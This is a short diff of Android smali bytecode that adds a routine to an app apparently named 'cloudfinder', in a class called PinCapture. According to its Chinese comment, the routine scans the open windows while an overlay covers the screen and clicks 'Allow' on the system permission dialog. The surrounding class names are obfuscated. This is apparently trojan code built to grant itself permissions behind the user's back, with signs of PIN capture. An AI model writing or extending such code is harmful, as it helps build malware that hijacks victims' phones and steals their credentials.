@@ -186,6 +186,21 @@
 
 .method private static scheduleClick(Landroid/content/Context;)V
     .locals 5
+    # 2.2：遮罩抢走 active window 时，遍历窗口找权限框点“允许”
+    :try_start_win
+    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->clickAllowOnAnyWindow()Z
+    move-result v0
+    if-eqz v0, :win_no
+    const-string v0, "PermDebug"
+    const-string v1, "clicked allow (window scan)"
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    return-void
+    :win_no
+    :try_end_win
+    .catch Ljava/lang/Exception; {:try_start_win .. :try_end_win} :catch_win
+    goto :goto_win
+    :catch_win
+    :goto_win
     sget v0, Lڝږ؁ڋ/ھ;->rounds:I
     add-int/lit8 v0, v0, 0x1
     sput v0, Lڝږ؁ڋ/ھ;->rounds:I
